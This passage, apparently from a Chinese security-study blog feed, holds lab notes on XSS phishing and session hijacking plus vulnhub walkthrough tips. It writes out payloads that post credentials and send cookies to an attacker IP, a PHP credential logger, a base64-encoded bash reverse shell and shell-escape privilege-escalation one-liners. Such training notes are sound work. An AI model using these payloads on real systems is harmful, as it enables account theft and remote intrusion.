Payloads</h4><p>查找XSS漏洞的最基本方法是针对给定网页中的输入字段手动测试各种XSS有效载荷。我们可以在网上找到XSS有效载荷的巨大列表，比如 [PayloadAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS</a> Injection&#x2F;README.md)上的或<a href="https://github.com/payloadbox/xss-payload-list">PayloadBox</a>中的。然后，我们可以开始逐一测试这些有效载荷，方法是复制每个有效载荷并将其添加到我们的表单中，然后查看是否弹出警报框。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?</p><p> What type of XSS was found on the above server? “name only”</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151738961.png" alt="image-20230815173856882"></p><p>我们使用工具进行扫描后发现email是可以注入xss的，然后把email参数用之前的测试代码测试了一下，发现确实可以：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151740417.png" alt="image-20230815174014373"></p><h1 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h1><p>另一种非常常见的XSS攻击是网络钓鱼攻击。网络钓鱼攻击通常利用看起来合法的信息诱骗受害者将其敏感信息发送给攻击者。XSS网络钓鱼攻击的一种常见形式是通过注入伪造的登录表单，将登录详细信息发送到攻击者的服务器，然后攻击者可以使用该服务器代表受害者登录并控制其帐户和敏感信息。 </p><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><p> 尝试为在上述服务器中的“&#x2F;philishing”中找到的图像URL表单找到一个有效的XSS负载，然后使用您在本节中学到的内容准备一个注入恶意登录表单的恶意URL。然后访问“&#x2F;philish&#x2F;send.php”将URL发送给受害者，他们将登录到恶意登录表单。如果您做得正确，您应该收到受害者的登录凭据，您可以使用该凭据登录到“&#x2F;philishing&#x2F;login.php”并获取标志。</p><p>我们来到钓鱼网站，确认网站可以注入后，尝试注入一个简单的钓鱼表单：</p><pre><code class="html">&lt;div&gt;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;input type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;text&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;/div&gt;</code></pre><p>注入代码：</p><pre><code class="javascript">document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151835805.png" alt="image-20230815183544764"></p><p>在用户‘登录’之前，我们不应该让原页面出现在页面上，这违背了我们的“请登录以继续”这句话。因此，为了鼓励受害者使用登录表单，我们应该删除URL字段，这样他们可能会认为必须登录才能使用该页面。为此，我们可以使用JavaScript函数document.getElementById（）.remove（）函数。 要找到要删除的HTML元素的id，我们可以通过单击[CTRL+SHIFT+C]打开页面检查器选取器，然后单击我们需要的元素可以得到该表单的id，然后将其移除：</p><pre><code class="javascript">document.getElementById(&#39;urlform&#39;).remove();</code></pre><p>我们发现还有一个原始的html代码在我们注入的表单之后，再插入一个注释将其删除：</p><pre><code class="html">...PAYLOAD... &lt;!-- </code></pre><p>完整的payload为：</p><pre><code>&#39;&gt;&lt;script&gt;document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.16.18&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;&lt;!--</code></pre><p>这里的开头要闭合一下前面的标签</p><p>最后我们得到了一下页面：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151901586.png" alt="image-20230815190115549"></p><p>此时我们用nc监听我们的80端口，然后用test：test”登录”网页：</p><p> <img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151905792.png" alt="image-20230815190550748"></p><p>我们盗取到了用户的凭证，然而，由于我们只使用netcat侦听器进行侦听，它将无法正确处理HTTP请求，受害者将收到“无法连接”错误，这可能会引起一些怀疑。因此，我们可以使用一个基本的PHP脚本来记录HTTP请求中的凭据，然后在不进行任何注入的情况下将受害者返回到原始页面。在这种情况下，受害者可能认为他们成功登录，并将按预期使用图像查看器。</p><pre><code class="php">&lt;?phpif (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])) &#123;    $file = fopen(&quot;creds.txt&quot;, &quot;a+&quot;);    fputs($file, &quot;Username: &#123;$_GET[&#39;username&#39;]&#125; | Password: &#123;$_GET[&#39;password&#39;]&#125;\n&quot;);    header(&quot;Location: http://SERVER_IP/phishing/index.php&quot;);    fclose($file);    exit();&#125;?&gt;</code></pre><p>这里要把第五行的重定向地址更改为目标地址。<code>Location</code> 是一个 HTTP 响应头，用于指示浏览器重定向到另一个页面。当服务器返回带有 <code>Location</code> 头的响应时，浏览器会根据该头信息将用户自动重定向到指定的 URL。</p><p>写好文件后搭建一个php服务器：</p><p><code>sudo php -S 0.0.0.0:80</code></p><p>具体而言：</p><ul><li><code>sudo</code>: 使用超级用户权限执行命令，可能需要管理员密码验证。</li><li><code>php</code>: 启动 PHP 解释器。</li><li><code>-S</code>: 启动 PHP 内置的 Web 服务器。</li><li><code>0.0.0.0:80</code>: 指定服务器监听的 IP 地址为 0.0.0.0，这表示允许所有可用的网络接口访问。端口为 80，这是默认的 HTTP 端口。</li></ul><p>此时网页就会自动重定向到原网页了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151919924.png" alt="image-20230815191923844"></p><h1 id="Session-Hijacking"><a href="#Session-Hijacking" class="headerlink" title="Session Hijacking"></a>Session Hijacking</h1><h2 id="Blind-XSS-Detection"><a href="#Blind-XSS-Detection" class="headerlink" title="Blind XSS Detection"></a>Blind XSS Detection</h2><p>盲XSS漏洞通常发生在只有特定用户（例如Admins）才能访问的表单中。一些潜在的例子包括： 联系人表格 评论 用户详细信息 支持票证 HTTP用户代理标头</p><p>我们将看不到我们的输入将如何处理，也看不到它在浏览器中的外观，因为它只会在我们无法访问的某个管理面板中显示给管理员。在正常情况下（即非盲），我们可以测试每个字段，直到我们得到一个警告框，就像我们在整个模块中所做的那样。然而，在这种情况下，由于我们无法访问Admin面板，如果我们看不到如何处理输出，我们如何检测XSS漏洞？</p><p>为此，我们可以使用上一节中使用的相同技巧，即使用JavaScript负载将HTTP请求发送回服务器。如果JavaScript代码被执行，我们将在机器上得到响应，我们就会知道页面确实存在漏洞。 然而，这引入了两个问题： 我们如何才能知道哪个特定领域是脆弱的？由于任何一个字段都可能执行我们的代码，所以我们不知道它们中的哪一个执行了。 我们如何知道要使用什么XSS有效载荷？既然页面可能有漏洞，但有效负载可能不起作用？</p><h2 id="Loading-a-Remote-Script"><a href="#Loading-a-Remote-Script" class="headerlink" title="Loading a Remote Script"></a>Loading a Remote Script</h2><p>在HTML中，我们可以在＜script＞标记中编写JavaScript代码，但我们也可以通过提供其URL来包含远程脚本，如下所示：</p><pre><code class="html">&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;</code></pre><p>因此，我们可以使用它来执行虚拟机上提供的远程JavaScript文件。我们可以将请求的脚本名称从script.js更改为我们正在注入的字段的名称，这样，当我们在VM中获得请求时，我们可以识别执行脚本的易受攻击的输入字段</p><p>如果我们收到&#x2F;username的请求，那么我们就知道username字段容易受到XSS的攻击，等等。这样，我们就可以开始测试加载远程脚本的各种XSS有效载荷，并查看其中哪些向我们发送请求。以下是我们可以从PayloadsAllTheThings中使用的几个示例：</p><pre><code class="html">&quot;&gt;&lt;script src=&quot;http://10.10.16.26/script.js&quot;&gt;&lt;/script&gt;</code></pre><pre><code>&quot;&gt;&lt;script new Image().src=&#39;http:/10.10.16.26/index.php?c=&#39;+document.cookie;&gt;&lt;/script&gt;</code></pre><pre><code class="html">&quot;&gt;&lt;script src=http://10.10.16.26&gt;&lt;/script&gt;javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;);a.src=\&#39;http://10.10.16.26\&#39;;document.body.appendChild(a)&#39;)&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;//10.10.16.26&quot;);a.send();&lt;/script&gt;&lt;script&gt;$.getScript(&quot;http://10.10.16.26&quot;)&lt;/script&gt;</code></pre><h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><p>What is the value of the ‘flag’ cookie?</p><p>网站大概是这么样子：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181824401.png" alt="image-20230818182419290"></p><p>发现没有url回显，只能手工注入检测</p><p>最后测试发现注入点是最下面的website</p><p>注入：</p><pre><code class="js">&quot;&gt;&lt;script src=&quot;http://10.10.16.26:8080/script.js&quot;&gt;&lt;/script&gt;</code></pre><p>然后本地script.js:</p><pre><code>new Image().src=&#39;http://10.10.16.26:8080/index.php?c=&#39;+document.cookie;</code></pre><p>然后用nc监听一下8080端口或者在8080端口启动一个服务器：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181836067.png" alt="image-20230818183623972"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;XSS-Testing-Payloads&quot;&gt;&lt;a href=&quot;#XSS-Testing-Payloads&quot; class=&quot;headerlink&quot; title=&quot;XSS Testing Payloads&quot;&gt;&lt;/a&gt;XSS Testing Payloads&lt;/h2&gt;&lt;p&gt;我们可以通过以下基本XSS负载来测试页面是否易受XSS攻击：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;script&amp;gt;alert(window.origin)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub_learning</title>
    <link href="https://taninluv.github.io/2023/08/12/vulnhub-learning/"/>
    <id>https://taninluv.github.io/2023/08/12/vulnhub-learning/</id>
    <published>2023-08-12T03:34:50.000Z</published>
    <updated>2023-09-10T07:22:34.580Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等</p><span id="more"></span><h1 id="THE-PLANETS-EARTH"><a href="#THE-PLANETS-EARTH" class="headerlink" title="THE PLANETS: EARTH"></a>THE PLANETS: EARTH</h1><p><a href="https://www.cnblogs.com/sainet/p/15638010.html">Vulnhub 靶场 THE PLANETS: EARTH - sainet - 博客园 (cnblogs.com)</a></p><ul><li><p>这个靶机不同于之前只扫描http协议，需要连httpx一起扫描</p></li><li><p>其中需要进行异或加密解密</p></li><li><p>RCE反弹shell的时候被禁用了远程连接，可以使用十六进制编码后直接绕过，或者base64，但是需要一点技巧：</p><pre><code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMS8yNTAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p>这里查询了一下这个逗号：</p></li></ul><pre><code class="GPT">echo 后面直接跟着逗号 ,，这实际上是一种不常见但合法的写法，被称为 Brace Expansion（花括号扩展）。在 Bash 中，花括号 &#123;&#125; 可以用于创建一组字符串的扩展，其中逗号分隔每个字符串。这种写法在很多情况下可以用来生成一系列的值。这里的 echo 和 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ== 是一对值，逗号分隔了这两个值。在这个上下文中，它的目的似乎是将一个值（YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ==）传递给 echo 命令。在子命令中，逗号 , 用于分隔多个子命令，以便按顺序执行它们。</code></pre><ul><li><p>靶机中提权时发现缺少二进制文件reset_root的触发器，需要进行调试查看，创建触发器</p></li><li><p>提权部分看到了两种调试工具：</p><ul><li><p>strings：<code>strings</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，它用于从二进制文件中提取可打印的字符串。当您需要检查一个二进制文件（如可执行文件、库文件等）中是否包含文本信息，或者需要分析文件中的字符串时，可以使用 <code>strings</code> 命令。</p><p>以下是一些常用的 <code>strings</code> 命令选项：</p><ul><li><code>-n length</code>：指定最小字符串长度。默认情况下，<code>strings</code> 提取长度至少为 4 个字符的字符串。</li><li><code>-a</code>：显示所有的字符串，而不仅仅是可打印字符的字符串。</li><li><code>-o</code>：将结果以字符串的偏移量（在文件中的位置）形式输出。</li><li><code>-t format</code>：指定输出的字符串格式，可以是 d (十进制)、o (八进制)、x (十六进制)。</li><li><code>-e encoding</code>：指定输入文件的字符编码。</li><li><code>-h</code>：显示命令的帮助信息。</li></ul></li><li><p>strace： <code>strace</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，用于跟踪和记录应用程序执行期间的系统调用和信号。通过使用 <code>strace</code>，您可以查看一个程序与操作系统之间的交互，以及它执行过程中发生的系统调用、信号和其他相关信息。这对于诊断问题、分析性能瓶颈以及理解程序的行为非常有用。</p><p>以下是一些常用的 <code>strace</code> 命令选项：</p><ul><li><code>-o file</code>：将跟踪信息输出到指定文件中，而不是输出到终端。</li><li><code>-e trace</code>：指定要跟踪的系统调用。例如，<code>-e open,read</code> 只会跟踪 <code>open</code> 和 <code>read</code> 系统调用。</li><li><code>-p pid</code>：跟踪一个已经运行的进程，而不是启动一个新的命令。</li><li><code>-f</code>：同时跟踪子进程。对于多进程应用程序，这可以捕获整个进程树的系统调用。</li><li><code>-s size</code>：限制输出的字符串长度，避免输出过长。</li><li><code>-c</code>：统计系统调用和出错情况的统计信息。</li><li><code>-h</code>：显示命令的帮助信息。</li></ul></li></ul></li></ul><blockquote><p>strace -o output.txt ls -l</p><p>这个命令将会跟踪 <code>ls -l</code> 命令的执行过程，并将跟踪信息输出到名为 <code>output.txt</code> 的文件中。</p></blockquote><h1 id="JANGOW"><a href="#JANGOW" class="headerlink" title="JANGOW"></a>JANGOW</h1><ul><li>有时候防火墙禁用nc -e 操作需要我们使用管道文件或者上传nc文件反弹shell，然后可以通过pty等一句话提权为交互式shell</li><li>其实一般的服务器做端口限制都不会限制80和443，可以把433作为反弹的端口，也可以用脚本简单探测一下：</li><li><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131125722.png" alt="image"></li></ul><pre><code>for i in &#123;1..65535&#125;;do timeout 1 nc -vz 192.168.11.128 $i &amp;&amp; echo &quot;$i open&quot;&gt;&gt; out.txt || echo &quot;si closed&quot; &gt;&gt; out.txt;done</code></pre><p>脚本的工作原理如下：</p><ol><li>使用 <code>for</code> 循环迭代端口范围从 1 到 65535。</li><li>对每个端口，使用 <code>timeout</code> 命令在 1 秒内尝试使用 <code>nc</code> 命令连接到指定的 IP 地址和端口。</li><li>如果连接成功，将输出 “$i open” 到 <code>out.txt</code> 文件。</li><li>如果连接失败（超时或连接被拒绝），将输出 “si closed” 到 <code>out.txt</code> 文件。</li><li><code>nc -vz</code> 是 <code>nc</code>（netcat）命令的一种使用方式，用于进行基本的网络连接测试和端口扫描。下面是对 <code>-vz</code> 参数的解释：<ul><li><code>-v</code>: 这个选项表示 “verbose”，即详细输出模式。当您使用 <code>-v</code> 参数时，<code>nc</code> 命令会显示更多关于连接和操作的详细信息，包括成功连接时的信息。</li><li><code>-z</code>: 这个选项表示 “zero-I&#x2F;O mode”，即零 I&#x2F;O 模式。在此模式下，<code>nc</code> 命令只会尝试建立连接，而不会进行实际的数据传输。这在执行端口扫描时很有用，因为它不会向目标发送任何实际的数据。</li></ul></li></ol><p>这里在博客<a href="https://www.cnblogs.com/sainet/p/15642784.html">Vulnhub 靶场 JANGOW: 1.0.1 - sainet - 博客园 (cnblogs.com)</a>中还提到一个端口绑定：</p><pre><code>sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234</code></pre><blockquote><ul><li><code>iptables</code>: Linux 上的防火墙管理工具。</li><li><code>-A PREROUTING</code>: 添加规则到 PREROUTING 链，这是网络数据包进入路由处理之前的链。</li><li><code>-t nat</code>: 指定操作的表类型为 “nat”，用于网络地址转换。</li><li><code>-p tcp</code>: 指定匹配 TCP 协议的数据包。</li><li><code>--dport 1:65535</code>: 匹配目标端口范围从 1 到 65535。</li><li><code>-j REDIRECT --to-port 1234</code>: 如果匹配，将数据包重定向到本地的 1234 端口。</li></ul></blockquote><h1 id="red"><a href="#red" class="headerlink" title="red"></a>red</h1><p>这是目前位置做到最好的靶机</p><p><a href="https://www.cnblogs.com/upfine/p/16783668.html">upfine的博客 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/dgs1mple/p/16035221.html#">你终于回来了(。・∀・)ノ (cnblogs.com)</a></p><ul><li><p>在web部分扫描到后文文件后打开是空白，此时需要再爆破一个参数进行传值</p></li><li><p>使用hashcat对密码行规则转换</p></li><li><p>提权部分切换用户打开shell：</p><p>sudo -u ippsec &#x2F;usr&#x2F;bin&#x2F;time &#x2F;bin&#x2F;bash</p></li><li><p>在拿到shell后，</p><ul><li>一个是查找用户有权限的文件</li></ul><p>find &#x2F; -group ippsec -type d 2&gt;&#x2F;dev&#x2F;null | grep -v proc.</p><p>（他这里其实是查找的的目录-type d 而不是文件 -type f）</p><ul><li>另一个博主是上传<a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s">pspy64s</a>监听系统运行的程序，然后发现了后门文件</li></ul></li></ul><p>在日志里发现执行后门代码的记录，命令：vi &#x2F;var&#x2F;log&#x2F;syslog，也查看了定时任务：vim &#x2F;etc&#x2F;crontab</p><p>使用命令：crontab -l可以查看执行后门文件的定时任务</p><h1 id="napping-1-0-1-ova"><a href="#napping-1-0-1-ova" class="headerlink" title="napping-1.0.1.ova."></a>napping-1.0.1.ova.</h1><p><a href="https://www.cnblogs.com/sainet/p/15650122.html">Vulnhub 靶场 NAPPING: 1.0.1 - sainet - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/csacs/article/details/104535225">Reverse Tabnabbing钓鱼_SoulCat.的博客-CSDN博客</a></p><p>这个靶机涉及到网络钓鱼，原理和刚学到的XSS差不多，但是Tab好像不需要设置钓鱼表单，在满足漏洞的情况下好像只需要监听端口就能接收到用户表单，这应该涉及到表单的提交和保存方式</p><p>提权部分修改py文件时使用的shell是 &#x2F;usr&#x2F;bin&#x2F;bash 而不是 &#x2F;bin&#x2F;shell执行脚本（在py文件中）,询问GPT一般用户也是可以使用&#x2F;bin&#x2F;bash的，但是这里可能是设置了权限，以后插入py文件应该要先测试相关情况。</p><p>vim提权时使用<code>！</code>可以执行外部shell命令，以此提权</p><h1 id="EMPIRE-BREAKOUT"><a href="#EMPIRE-BREAKOUT" class="headerlink" title="EMPIRE: BREAKOUT"></a>EMPIRE: BREAKOUT</h1><p><a href="https://www.cnblogs.com/sainet/p/15682132.html#3-10000-%E7%AB%AF%E5%8F%A3">Vulnhub 靶场 EMPIRE: BREAKOUT - sainet - 博客园 (cnblogs.com)</a></p><p>在web部分需要使用enum4linux工具检测服务器上的smb用户结合找到的密码登录后台，smbmap更适合当作客户端登录</p><p>提权部分需要寻找一些可用文件，一般来说对于网站可以寻找一些配置文件<code>*.conf</code> <code>*.config</code>等文件，对于本地提权则可以寻找一些隐藏文件、有权限的文件、密码文件等</p><p>这里白给了一个tar命令，使用getcap查看发现read&#x3D;ep，可以通过加解压对一些文件越权访问，命令：</p><p><code>./tar -cvf pass.tar /var/backups/.old_pass.bak</code></p><ul><li><code>-c</code>: 表示创建一个新的归档文件。</li><li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li><li><code>-f</code>: 后面紧跟着要创建的归档文件的名称。</li></ul><p><code>./tar -xvf pass.tar </code></p><ul><li><code>-x</code>: 表示从归档文件中提取（解压缩）文件。</li><li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li><li><code>-f</code>: 后面紧跟着要提取的归档文件的名称。</li></ul><h1 id="Vulnhub-Empire-LupinOne"><a href="#Vulnhub-Empire-LupinOne" class="headerlink" title="Vulnhub-Empire: LupinOne"></a>Vulnhub-Empire: LupinOne</h1><p><a href="https://www.cnblogs.com/C0ngvv/p/15607026.html">Vulnhub-Empire: LupinOne题解 - C0ngvv - 博客园 (cnblogs.com)</a></p><p>这里挺有意思的，在爬虫文件中找到了一个：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191102804.png" alt="img"></p><p>在而后的扫描中使用<code>~FUZZ</code>查找文件，这实际算得上一个提示hh。</p><p>在ssh密钥登录时，使用ssh -i 指定ssh_key</p><p>这里遇到一个Enter passphrase for key</p><blockquote><p>GPT:<br>在 SSH 连接时，”passphrase” 是指用于保护 SSH 私钥的密码。私钥是 SSH 密钥对中的一部分，用于对连接进行身份验证和加密通信。私钥需要受到保护，以防止未经授权的访问。</p><p>通常情况下，SSH 密钥对由两部分组成：公钥和私钥。公钥存储在远程服务器上，而私钥存储在本地机器上。当您尝试进行 SSH 连接时，您的私钥将用于身份验证。</p><p>如果您的私钥设置了 passphrase（也称为密码短语），则在每次使用私钥进行身份验证时，您都需要输入这个 passphrase。这增加了私钥的安全性，因为即使其他人获得了您的私钥文件，他们也无法在没有知道 passphrase 的情况下使用它。</p></blockquote><p>在提权时给的特权命令制定了非root用户，只能横向移动：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191103261.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191103373.png" alt="img"></p><p>最后提权部分用到pip，文件给的提权代码：</p><pre><code>TF=$(mktemp -d)echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF/setup.pypip install $TF</code></pre><p>核心部分还有点疑惑，留个引子</p><h1 id="thale"><a href="#thale" class="headerlink" title="thale"></a>thale</h1><p><a href="https://www.cnblogs.com/sainet/p/15655638.html">Vulnhub 靶场 THALES: 1 - sainet - 博客园 (cnblogs.com)</a></p><p>这个靶机只能说中规中矩吧，web部分用到了msf 和msfveno，感觉很少用到msfveno但确实挺好用的</p><p>提权部分几个博客园的博主讲得都不算很好，尤其是用backup.sh反弹root shell 时为什么等一会就能连接上，我查看了crontab和ps aux ，没有root是看不到定时任务，只有在ps进程中看到了备份脚本在被root执行：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181112204.png" alt="image-20230818111232141"></p><p>root:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181113859.png" alt="image-20230818111307806"></p><p>这里看到脚本5min执行一次</p><p>我们根据脚本指引来到保存备份文件的地方，发现上一次备份在5分钟前：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181116917.png" alt="image-20230818111611873"></p><p>（其实这里是写文章的时候刚好过了五分钟被截到），一般而言是可以看到上一次备份在几分钟前从而确证它可以自动执行备份。</p><p>最后有提个挺有意思的是，横向移动的时候发现su提示需要一个终端，而使用pty提权后就可以移动了</p><p>大概查了一下：</p><p><a href="https://www.cnblogs.com/sainet/p/15783539.html">Linux 反向 shell 升级为完全可用的 TTY shell - sainet - 博客园 (cnblogs.com)</a></p><p>推测nc得到的shell比较受限，查询了一下TTY：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181124899.png" alt="image-20230818112416855"></p><p>这里看到一直用的一句话提权实际上是伪终端（那就是说伪终端也算终端咯？）</p><h1 id="ICA1"><a href="#ICA1" class="headerlink" title="ICA1"></a>ICA1</h1><p><a href="https://blog.csdn.net/ROSEBUD7_K/article/details/126163403">vulnhub-ica1-通关流程 &#x2F;&#x2F; Kali &amp; 靶场 &amp; 渗透 &amp; Linux_KHDXS7的博客-CSDN博客</a></p><p>挺有意思的一个靶机，先后用了不同的php脚本才反弹了一个可用的shell虽然还是很难用。。</p><p>在web部分dirb先扫到了一个upload目录，在里面有一个users和attachment目录，估计有文件上传漏洞，然后在配置文件中找到了mysql账户密码，登录之后在数据库中分别找到了管理员的邮箱和phpass加密的密码，以及一些用户名表和base64加密的密码表。</p><blockquote><p><code>phpass</code> 以密码哈希算法的方式实现了这一点，同时还提供了一些附加的安全性功能，如防止彩虹表攻击、重放攻击等。</p><p>主要功能和设计原则包括：</p><ol><li><strong>强密码哈希</strong>：<code>phpass</code> 使用哈希算法对密码进行多轮迭代，从而增加破解难度。</li><li><strong>盐值（Salt）</strong>：<code>phpass</code> 使用随机生成的盐值来增加密码哈希的随机性，以及对相同密码的不同哈希值。这有助于防止彩虹表攻击。</li><li><strong>迭代计算</strong>：<code>phpass</code> 通过多次迭代哈希算法，增加破解密码的成本，从而提高密码的安全性。</li><li><strong>密码更新</strong>：<code>phpass</code> 支持密码更新，同时保留旧密码的哈希值，以便在用户登录时验证旧密码。</li><li><strong>防护</strong>：<code>phpass</code> 试图防止不同类型的攻击，如嗅探攻击、重放攻击等。</li><li><code>$P$</code> 是 <code>phpass</code> 中的一个标识符</li></ol></blockquote><p>此时有了两种进攻方式，一个是破解管理员的账户密码，从网页登录管理员后台寻找漏洞，一个是用hydra使用这两个表进行ssh爆破，实际两种都是可行的。</p><p>这里破解管理员密码实际上是使用<code> mkpasswd</code> 创建一个密码替换了原来的密码，正好是Mysql管理员可以执行这个操作，也算是提供了一个思路，那么其实另外一个用户密码表应该也能这么做。</p><p>在管理员后台一个是可以创建用户上传头像，另一个是可以创建工程添加附件，这正好对应了之前upload里猜测的有文件上传漏洞。</p><p>提权部分使用string检查特权文件，发现它在suid下执行cat，使用命令劫持提权成功</p><h1 id="noob："><a href="#noob：" class="headerlink" title="noob："></a>noob：</h1><p><a href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p><p>这个靶机挺无语的，web部分拿到了一个信息隐写的压缩文件，然后使用<code>steghide</code>进行拆解:</p><p><code>info &lt;filename&gt;</code>:显示文件信息</p><p><code>extract -sf &lt;filename&gt;</code>:拆解文件（需要密码短语，可能为空）</p><p>后面的提权就是找找找，很难想象有一台明文保存其他用户账号密码的用户配置……找了很多东西发现不如遍历本地用户目录</p><p>最后的nano提权文件给出的wp：</p><pre><code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></pre><blockquote><ul><li><code>reset</code>: 这是一个命令，通常用于重置终端显示，清除屏幕上的内容，使终端重新初始化。</li><li><code>sh</code>: 这是一个启动 Shell（命令行解释器）的命令。在这里，它被用于启动一个新的 Shell 进程。</li><li><code>1&gt;&amp;0</code> 和 <code>2&gt;&amp;0</code>：这些是重定向操作符。<code>1&gt;&amp;0</code> 表示将标准输出（文件描述符 1）重定向到标准输入（文件描述符 0），<code>2&gt;&amp;0</code> 表示将标准错误（文件描述符 2）重定向到标准输入（文件描述符 0）。</li></ul></blockquote><p>没有很理解，可能是重启一个终端sh然后把所有信息都重定向到当前nano的输入以便于显示？因为不执行reset整个shell就死机了，不重定向看不到回显</p><h1 id="DRIPPING-BLUES-1"><a href="#DRIPPING-BLUES-1" class="headerlink" title="DRIPPING BLUES: 1"></a>DRIPPING BLUES: 1</h1><p><a href="https://www.freebuf.com/articles/web/327947.html">【Vulnhub 靶场】DRIPPING BLUES: 1 - FreeBuf网络安全行业门户</a></p><p>这个靶机需要破解加密的zip文件：</p><p><code>fcrackzip </code></p><pre><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u respectmydrip.zip</code></pre><p>这里提到ftp穷举爆破可以使用MSF：ftp_login模块</p><p>在robots中发现一个&#x2F;etc。。。推断有文件包含漏洞。</p><p>第二次遇到使用Polkit提权：</p><blockquote><p>基本目前除了最新版的Polkit修复了该漏洞，其他版本都可以提权，可利用版本的范围极大。（<a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py%EF%BC%89">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py）</a></p></blockquote><p>这里该博主拿到shell后的环境检测也挺细致的</p><h1 id="doubletrouble"><a href="#doubletrouble" class="headerlink" title="doubletrouble"></a>doubletrouble</h1><p><a href="https://www.cnblogs.com/sainet/p/15673203.html">Vulnhub 靶场 DOUBLETROUBLE: 1 - sainet - 博客园 (cnblogs.com)</a></p><p>这里再次用到了图片隐写：stegseek</p><p>爆破：stegseek -crack *.png rockyou.txt -xf output</p><p>上一次拆解隐藏信息的文件使用的是steghide,查询了一下大致seek用于检测，hide大多是用于隐写，当然提取也可以。</p><p>在第二次提权部分我确实不知道怎么快速辨别这个靶机存在dirtucow漏洞，可能遇到比较老的版本都可以拿去对比一下吧</p><h1 id="darkhole2"><a href="#darkhole2" class="headerlink" title="darkhole2 *"></a>darkhole2 *</h1><p><a 